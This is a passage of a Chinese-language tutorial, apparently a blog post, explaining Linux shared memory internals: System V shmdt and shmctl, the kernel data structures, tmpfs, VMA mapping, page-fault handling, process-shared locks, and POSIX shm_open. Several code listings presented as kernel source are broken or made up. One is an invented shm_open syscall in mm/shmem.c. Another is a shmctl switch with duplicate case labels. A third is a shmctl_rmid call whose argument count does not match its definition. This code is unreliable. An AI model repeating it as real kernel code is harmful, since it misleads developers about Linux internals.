<span class="hljs-type">static</span> <span class="hljs-type">int</span> __shm_open(<span class="hljs-keyword">struct</span> vm_area_struct *vma)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> vma-&gt;vm_file;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span> =</span> shm_file_data(file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    
    <span class="hljs-comment">// 1. 获取共享内存段</span>
    shp = shm_lock(sfd-&gt;ns, sfd-&gt;id);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 2. 验证文件是否匹配</span>
    <span class="hljs-keyword">if</span> (shp-&gt;shm_file != sfd-&gt;file) {
        shm_unlock(shp);
        <span class="hljs-keyword">return</span> -EINVAL;  <span class="hljs-comment">// ID 被重用</span>
    }
    
    <span class="hljs-comment">// 3. 更新统计信息</span>
    shp-&gt;shm_atim = ktime_get_real_seconds();
    ipc_update_pid(&amp;shp-&gt;shm_lprid, task_tgid(current));
    shp-&gt;shm_nattch++;
    
    shm_unlock(shp);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>引用计数</strong>：每次映射时，<code>shm_nattch</code> 增加</li>
<li><strong>vm_ops 替换</strong>：将 VMA 的 <code>vm_ops</code> 替换为 <code>shm_vm_ops</code></li>
<li><strong>文件验证</strong>：确保文件没有被删除和重用</li>
</ol>
<h3 data-id="heading-9">2.5 shmdt() 的实现原理</h3>
<p><strong>shmdt() 的作用</strong>：</p>
<p>从进程地址空间分离共享内存段。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
SYSCALL_DEFINE1(shmdt, <span class="hljs-type">char</span> __user *, shmaddr)
{
    <span class="hljs-keyword">return</span> ksys_shmdt(shmaddr);
}

<span class="hljs-type">long</span> <span class="hljs-title function_">ksys_shmdt</span><span class="hljs-params">(<span class="hljs-type">char</span> __user *shmaddr)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)shmaddr;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>, *<span class="hljs-title">next</span>;</span>
    <span class="hljs-type">int</span> retval = -EINVAL;
    
    <span class="hljs-comment">// 1. 查找包含该地址的 VMA</span>
    vma = find_vma(current-&gt;mm, addr);
    <span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-comment">// 2. 验证是否是共享内存映射</span>
    <span class="hljs-keyword">if</span> (vma-&gt;vm_ops != &amp;shm_vm_ops)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-comment">// 3. 取消映射</span>
    size = vma-&gt;vm_end - vma-&gt;vm_start;
    retval = do_munmap(current-&gt;mm, addr, size, <span class="hljs-literal">NULL</span>);
    
    <span class="hljs-keyword">return</span> retval;
}
</code></pre>
<p><strong>shm_close() 函数</strong>：</p>
<p>当 VMA 被取消映射时，内核会调用 <code>shm_close()</code>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">shm_close</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> vma-&gt;vm_file;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span> =</span> shm_file_data(file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span> =</span> sfd-&gt;ns;
    
    down_write(&amp;shm_ids(ns).rwsem);
    
    <span class="hljs-comment">// 1. 获取共享内存段</span>
    shp = shm_lock(ns, sfd-&gt;id);
    <span class="hljs-keyword">if</span> (WARN_ON_ONCE(IS_ERR(shp)))
        <span class="hljs-keyword">goto</span> done;
    
    <span class="hljs-comment">// 2. 更新统计信息</span>
    ipc_update_pid(&amp;shp-&gt;shm_lprid, task_tgid(current));
    shp-&gt;shm_dtim = ktime_get_real_seconds();
    shp-&gt;shm_nattch--;
    
    <span class="hljs-comment">// 3. 检查是否需要销毁</span>
    <span class="hljs-keyword">if</span> (shm_may_destroy(shp))
        shm_destroy(ns, shp);
    <span class="hljs-keyword">else</span>
        shm_unlock(shp);
    
done:
    up_write(&amp;shm_ids(ns).rwsem);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>查找 VMA</strong>：根据地址查找对应的 VMA</li>
<li><strong>验证类型</strong>：确保是共享内存映射</li>
<li><strong>取消映射</strong>：调用 <code>do_munmap()</code> 取消内存映射</li>
<li><strong>更新统计</strong>：减少 <code>shm_nattch</code>，更新分离时间</li>
</ol>
<h3 data-id="heading-10">2.6 shmctl() 的实现原理</h3>
<p><strong>shmctl() 的作用</strong>：</p>
<p>控制共享内存段，包括获取信息、设置权限、删除等。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">long</span> <span class="hljs-title function_">ksys_shmctl</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">int</span> cmd, <span class="hljs-keyword">struct</span> shmid_ds __user *buf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-type">int</span> err, version;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>
    
    ns = current-&gt;nsproxy-&gt;ipc_ns;
    
    <span class="hljs-keyword">if</span> (cmd &lt; <span class="hljs-number">0</span> || shmid &lt; <span class="hljs-number">0</span>)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-keyword">switch</span> (cmd) {
    <span class="hljs-keyword">case</span> IPC_INFO:
    <span class="hljs-keyword">case</span> SHM_INFO:
    <span class="hljs-keyword">case</span> SHM_STAT:
    <span class="hljs-keyword">case</span> SHM_STAT_ANY:
        <span class="hljs-comment">// 获取信息</span>
        <span class="hljs-keyword">return</span> shmctl_info(ns, shmid, cmd, buf);
        
    <span class="hljs-keyword">case</span> IPC_STAT:
    <span class="hljs-keyword">case</span> SHM_STAT:
    <span class="hljs-keyword">case</span> SHM_STAT_ANY:
        <span class="hljs-comment">// 获取共享内存段状态</span>
        <span class="hljs-keyword">return</span> shmctl_stat(ns, shmid, cmd, buf);
        
    <span class="hljs-keyword">case</span> IPC_SET:
        <span class="hljs-comment">// 设置共享内存段属性</span>
        <span class="hljs-keyword">return</span> shmctl_set(ns, shmid, cmd, buf);
        
    <span class="hljs-keyword">case</span> IPC_RMID:
        <span class="hljs-comment">// 删除共享内存段</span>
        <span class="hljs-keyword">return</span> shmctl_rmid(ns, shmid, cmd);
        
    <span class="hljs-keyword">case</span> SHM_LOCK:
        <span class="hljs-comment">// 锁定共享内存段（防止交换）</span>
        <span class="hljs-keyword">return</span> shmctl_lock(ns, shmid);
        
    <span class="hljs-keyword">case</span> SHM_UNLOCK:
        <span class="hljs-comment">// 解锁共享内存段</span>
        <span class="hljs-keyword">return</span> shmctl_unlock(ns, shmid);
        
    <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> -EINVAL;
    }
}
</code></pre>
<p><strong>IPC_RMID 的实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shmctl_rmid</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipc_namespace *ns, <span class="hljs-type">int</span> shmid)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    
    shp = shm_lock(ns, shmid);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 1. 检查权限</span>
    <span class="hljs-keyword">if</span> (ns-&gt;shm_rmid_forced ||
        (shp-&gt;shm_perm.mode &amp; SHM_DEST) ||
        (shp-&gt;shm_nattch == <span class="hljs-number">0</span>)) {
        <span class="hljs-comment">// 2. 标记为删除</span>
        do_shm_rmid(ns, &amp;shp-&gt;shm_perm);
        shm_unlock(shp);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 3. 如果还有进程附加，只标记为删除</span>
        shp-&gt;shm_perm.mode |= SHM_DEST;
        ipc_set_key_private(&amp;shm_ids(ns), &amp;shp-&gt;shm_perm);
        shm_unlock(shp);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>IPC_STAT</strong>：获取共享内存段状态信息</li>
<li><strong>IPC_SET</strong>：设置共享内存段属性（权限、大小等）</li>
<li><strong>IPC_RMID</strong>：删除共享内存段（如果还有进程附加，标记为删除，最后一个进程分离时真正删除）</li>
<li><strong>SHM_LOCK/SHM_UNLOCK</strong>：锁定/解锁共享内存段，防止交换到磁盘</li>
</ol>
<hr/>
<h2 data-id="heading-11">3. 底层实现原理</h2>
<h3 data-id="heading-12">3.1 数据结构</h3>
<p><strong>shmid_kernel 结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> /* <span class="hljs-title">private</span> <span class="hljs-title">to</span> <span class="hljs-title">the</span> <span class="hljs-title">kernel</span> */
{</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span>  <span class="hljs-title">shm_perm</span>;</span>  <span class="hljs-comment">// IPC 权限结构</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>          *<span class="hljs-title">shm_file</span>;</span>   <span class="hljs-comment">// 指向 tmpfs 文件的指针</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        shm_nattch;  <span class="hljs-comment">// 附加计数</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        shm_segsz;   <span class="hljs-comment">// 段大小</span>
    <span class="hljs-type">time64_t</span>             shm_atim;    <span class="hljs-comment">// 最后附加时间</span>
    <span class="hljs-type">time64_t</span>             shm_dtim;    <span class="hljs-comment">// 最后分离时间</span>
    <span class="hljs-type">time64_t</span>             shm_ctim;    <span class="hljs-comment">// 最后修改时间</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span>           *<span class="hljs-title">shm_cprid</span>;</span>  <span class="hljs-comment">// 创建进程 ID</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span>           *<span class="hljs-title">shm_lprid</span>;</span>  <span class="hljs-comment">// 最后附加进程 ID</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucounts</span>       *<span class="hljs-title">mlock_ucounts</span>;</span>  <span class="hljs-comment">// 锁定计数</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>   *<span class="hljs-title">shm_creator</span>;</span>     <span class="hljs-comment">// 创建进程</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>     <span class="hljs-title">shm_clist</span>;</span>        <span class="hljs-comment">// 创建者列表</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>              <span class="hljs-comment">// IPC 命名空间</span>
};
</code></pre>
<p><strong>shm_file_data 结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> {</span>
    <span class="hljs-type">int</span> id;                              <span class="hljs-comment">// 共享内存 ID</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>            <span class="hljs-comment">// IPC 命名空间</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>                   <span class="hljs-comment">// 底层文件</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span>  <span class="hljs-comment">// 原始 vm_ops</span>
};
</code></pre>
<p><strong>关键字段说明</strong>：</p>
<ol>
<li>
<p><strong>shm_perm</strong>：</p>
<ul>
<li><strong>作用</strong>：IPC 权限和标识</li>
<li><strong>包含</strong>：key、ID、权限、所有者等</li>
</ul>
</li>
<li>
<p><strong>shm_file</strong>：</p>
<ul>
<li><strong>作用</strong>：指向 tmpfs 文件的指针</li>
<li><strong>类型</strong>：<code>struct file *</code></li>
<li><strong>作用</strong>：共享内存段实际上是一个 tmpfs 文件</li>
</ul>
</li>
<li>
<p><strong>shm_nattch</strong>：</p>
<ul>
<li><strong>作用</strong>：当前附加到该段的进程数</li>
<li><strong>更新</strong>：每次 <code>shmat()</code> 时增加，<code>shmdt()</code> 时减少</li>
</ul>
</li>
<li>
<p><strong>shm_segsz</strong>：</p>
<ul>
<li><strong>作用</strong>：共享内存段的大小（字节）</li>
<li><strong>限制</strong>：受 <code>shm_ctlmax</code> 限制</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">3.2 tmpfs 文件系统</h3>
<p><strong>tmpfs 的作用</strong>：</p>
<p>System V 共享内存段实际上是在 tmpfs 文件系统中创建的文件。tmpfs 是一个基于内存的文件系统，数据存储在 RAM 中。</p>
<p><strong>tmpfs 的特点</strong>：</p>
<ol>
<li><strong>内存存储</strong>：数据存储在 RAM 中，访问速度快</li>
<li><strong>可交换</strong>：如果内存不足，可以交换到交换分区</li>
<li><strong>临时性</strong>：系统重启后数据丢失</li>
<li><strong>动态大小</strong>：可以根据需要动态增长</li>
</ol>
<p><strong>shmem_file_setup() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-keyword">struct</span> file *<span class="hljs-title function_">shmem_file_setup</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">loff_t</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span>
{
    <span class="hljs-type">int</span> error;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span> *<span class="hljs-title">dentry</span>, *<span class="hljs-title">root</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">qstr</span> <span class="hljs-title">this</span>;</span>
    
    <span class="hljs-comment">// 1. 获取 tmpfs 挂载点</span>
    root = shm_mnt-&gt;mnt_root;
    
    <span class="hljs-comment">// 2. 创建 dentry</span>
    this.name = name;
    this.len = <span class="hljs-built_in">strlen</span>(name);
    this.hash = <span class="hljs-number">0</span>;
    dentry = d_alloc(root, &amp;this);
    <span class="hljs-keyword">if</span> (!dentry)
        <span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);
    
    <span class="hljs-comment">// 3. 创建 inode</span>
    inode = shmem_get_inode(root-&gt;d_sb, <span class="hljs-literal">NULL</span>, S_IFREG | S_IRWXUGO, <span class="hljs-number">0</span>, flags);
    <span class="hljs-keyword">if</span> (!inode) {
        dput(dentry);
        <span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);
    }
    
    <span class="hljs-comment">// 4. 设置文件大小</span>
    inode-&gt;i_size = size;
    d_instantiate(dentry, inode);
    inode-&gt;i_nlink = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 5. 创建文件</span>
    file = alloc_file_pseudo(inode, shm_mnt, dentry-&gt;d_name.name,
                              O_RDWR | (flags &amp; O_ACCMODE),
                              &amp;shmem_file_operations);
    
    <span class="hljs-keyword">return</span> file;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>文件创建</strong>：在 tmpfs 中创建文件</li>
<li><strong>大小设置</strong>：设置文件大小为共享内存段大小</li>
<li><strong>文件操作</strong>：使用 <code>shmem_file_operations</code> 作为文件操作函数</li>
</ol>
<h3 data-id="heading-14">3.3 内存映射机制</h3>
<p><strong>mmap() 的作用</strong>：</p>
<p>将文件映射到进程地址空间，实现共享内存的访问。</p>
<p><strong>映射流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 进程调用 shmat()
   ↓
<span class="hljs-bullet">2.</span> 内核调用 do<span class="hljs-emphasis">_mmap_</span>pgoff()
   ↓
<span class="hljs-bullet">3.</span> 创建 VMA（虚拟内存区域）
   ↓
<span class="hljs-bullet">4.</span> 设置 VMA 属性（地址、大小、权限等）
   ↓
<span class="hljs-bullet">5.</span> 将 VMA 添加到进程的 mm<span class="hljs-emphasis">_struct
   ↓
6. 返回虚拟地址
</span></code></pre>
<p><strong>VMA 结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// include/linux/mm_types.h</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> {</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_start;      <span class="hljs-comment">// 起始地址</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_end;        <span class="hljs-comment">// 结束地址</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span>     <span class="hljs-comment">// 所属进程</span>
    <span class="hljs-type">pgprot_t</span> vm_page_prot;       <span class="hljs-comment">// 页面保护</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_flags;      <span class="hljs-comment">// 标志（MAP_SHARED 等）</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">vm_file</span>;</span>        <span class="hljs-comment">// 映射的文件</span>
    <span class="hljs-type">void</span> *vm_private_data;       <span class="hljs-comment">// 私有数据</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span>  <span class="hljs-comment">// 操作函数</span>
    <span class="hljs-comment">// ...</span>
};
</code></pre>
<p><strong>页面错误处理</strong>：</p>
<p>当进程访问共享内存时，如果页面不在内存中，会触发页面错误：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">shmem_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(vma-&gt;vm_file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span>
    <span class="hljs-type">vm_fault_t</span> ret = VM_FAULT_LOCKED;
    
    <span class="hljs-comment">// 1. 获取页面</span>
    page = shmem_getpage_gfp(inode, vmf-&gt;pgoff, &amp;vmf-&gt;page,
                              SGP_CACHE, vmf-&gt;gfp_mask, vma, vmf, <span class="hljs-literal">NULL</span>);
    
    <span class="hljs-keyword">if</span> (!page)
        <span class="hljs-keyword">return</span> VM_FAULT_OOM;
    
    <span class="hljs-comment">// 2. 如果页面在交换分区，需要换入</span>
    <span class="hljs-keyword">if</span> (PageSwapCache(page)) {
        swap_readpage(page, <span class="hljs-literal">true</span>);
        wait_on_page_locked(page);
    }
    
    <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>延迟分配</strong>：页面在首次访问时才分配</li>
<li><strong>交换支持</strong>：如果内存不足，页面可以交换到交换分区</li>
<li><strong>写时复制</strong>：如果使用 <code>MAP_PRIVATE</code>，会使用写时复制</li>
</ol>
<h3 data-id="heading-15">3.4 同步机制</h3>
<p><strong>为什么需要同步</strong>：</p>
<p>多个进程访问共享内存时，需要同步机制来避免竞争条件。</p>
<p><strong>常见的同步机制</strong>：</p>
<ol>
<li>
<p><strong>信号量（Semaphore）</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span>

<span class="hljs-comment">// 创建信号量</span>
<span class="hljs-type">int</span> semid = semget(key, <span class="hljs-number">1</span>, IPC_CREAT | <span class="hljs-number">0666</span>);

<span class="hljs-comment">// P 操作（等待）</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sop</span> =</span> {<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>};
semop(semid, &amp;sop, <span class="hljs-number">1</span>);

<span class="hljs-comment">// V 操作（释放）</span>
sop.sem_op = <span class="hljs-number">1</span>;
semop(semid, &amp;sop, <span class="hljs-number">1</span>);
</code></pre>
</li>
<li>
<p><strong>互斥锁（Mutex）</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>

<span class="hljs-comment">// 在共享内存中创建互斥锁</span>
<span class="hljs-type">pthread_mutex_t</span> *mutex = (<span class="hljs-type">pthread_mutex_t</span> *)shm_addr;
<span class="hljs-type">pthread_mutexattr_t</span> attr;
pthread_mutexattr_init(&amp;attr);
pthread_mutexattr_setpshared(&amp;attr, PTHREAD_PROCESS_SHARED);
pthread_mutex_init(mutex, &amp;attr);

<span class="hljs-comment">// 使用</span>
pthread_mutex_lock(mutex);
<span class="hljs-comment">// 临界区</span>
pthread_mutex_unlock(mutex);
</code></pre>
</li>
<li>
<p><strong>条件变量（Condition Variable）</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>

<span class="hljs-type">pthread_cond_t</span> *cond = (<span class="hljs-type">pthread_cond_t</span> *)shm_addr;
<span class="hljs-type">pthread_condattr_t</span> attr;
pthread_condattr_init(&amp;attr);
pthread_condattr_setpshared(&amp;attr, PTHREAD_PROCESS_SHARED);
pthread_cond_init(cond, &amp;attr);

<span class="hljs-comment">// 等待</span>
pthread_cond_wait(cond, mutex);

<span class="hljs-comment">// 通知</span>
pthread_cond_signal(cond);
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-16">4. POSIX 共享内存</h2>
<h3 data-id="heading-17">4.1 POSIX 共享内存 API</h3>
<p><strong>核心函数</strong>：</p>
<ol>
<li><strong><code>shm_open()</code></strong>：创建或打开共享内存对象</li>
<li><strong><code>shm_unlink()</code></strong>：删除共享内存对象</li>
<li><strong><code>mmap()</code></strong>：映射共享内存到进程地址空间</li>
<li><strong><code>munmap()</code></strong>：取消映射</li>
</ol>
<p><strong>函数原型</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>

<span class="hljs-comment">// 创建或打开共享内存对象</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shm_open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">int</span> oflag, <span class="hljs-type">mode_t</span> mode)</span>;

<span class="hljs-comment">// 删除共享内存对象</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shm_unlink</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;

<span class="hljs-comment">// 映射共享内存</span>
<span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;

<span class="hljs-comment">// 取消映射</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length)</span>;
</code></pre>
<h3 data-id="heading-18">4.2 shm_open() 的实现原理</h3>
<p><strong>shm_open() 的作用</strong>：</p>
<p>在 <code>/dev/shm</code> 目录下创建或打开共享内存文件。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
SYSCALL_DEFINE3(shm_open, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, name, <span class="hljs-type">int</span>, oflag, <span class="hljs-type">umode_t</span>, mode)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">path</span> <span class="hljs-title">path</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-type">int</span> err;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;
    
    <span class="hljs-keyword">if</span> (oflag &amp; ~(O_CREAT | O_RDWR | O_TRUNC | O_EXCL | O_CLOEXEC))
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-keyword">if</span> (oflag &amp; O_CREAT) {
        <span class="hljs-keyword">if</span> (oflag &amp; O_EXCL)
            lookup_flags |= LOOKUP_EXCL;
        lookup_flags |= LOOKUP_CREATE;
    }
    
    <span class="hljs-comment">// 1. 在 /dev/shm 中查找或创建文件</span>
    err = user_path_create(AT_FDCWD, name, &amp;path, lookup_flags);
    <span class="hljs-keyword">if</span> (err)
        <span class="hljs-keyword">return</span> err;
    
    <span class="hljs-comment">// 2. 打开文件</span>
    file = dentry_open(&amp;path, oflag, current_cred());
    path_put(&amp;path);
    
    <span class="hljs-keyword">if</span> (IS_ERR(file))
        <span class="hljs-keyword">return</span> PTR_ERR(file);
    
    <span class="hljs-comment">// 3. 设置文件大小（如果是新创建的文件）</span>
    <span class="hljs-keyword">if</span> (oflag &amp; O_CREAT) {
        <span class="hljs-keyword">if</span> (oflag &amp; O_TRUNC) {
            err = do_ftruncate(file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
            <span class="hljs-keyword">if</span> (err)
                <span class="hljs-keyword">goto</span> out;
        }
    }
    
    <span class="hljs-comment">// 4. 返回文件描述符</span>
    <span class="hljs-keyword">return</span> fd_install(fd, file);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>文件位置</strong>：在 <code>/dev/shm</code> 目录下创建文件</li>
<li><strong>文件系统</strong>：使用 tmpfs 文件系统</li>
<li><strong>文件描述符</strong>：返回文件描述符，可以用于 <code>mmap()</code></li>
</ol>
<h3 data-id="heading-19">4.3 POSIX vs System V 共享内存</h3>













































<table><thead><tr><th>特性</th><th>System V</th><th>POSIX</th></tr></thead><tbody><tr><td><strong>标识方式</strong></td><td>key_t key</td><td>文件名</td></tr><tr><td><strong>标准</strong></td><td>System V IPC</td><td>POSIX</td></tr><tr><td><strong>API</strong></td><td>shmget/shmat/shmdt</td><td>shm_open/mmap/munmap</td></tr><tr><td><strong>文件系统</strong></td><td>tmpfs（内核内部）</td><td>tmpfs（/dev/shm）</td></tr><tr><td><strong>权限</strong></td><td>IPC 权限</td><td>文件系统权限</td></tr><tr><td><strong>删除</strong></td><td>shmctl(IPC_RMID)</td><td>shm_unlink()</td></tr><tr><td><strong>可移植性</strong></td><td>较低</td><td>较高</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-20">5. 使用示例</h2>
<h3 data-id="heading-21">5.1 System V 共享内存示例</h3>
<p><strong>创建共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
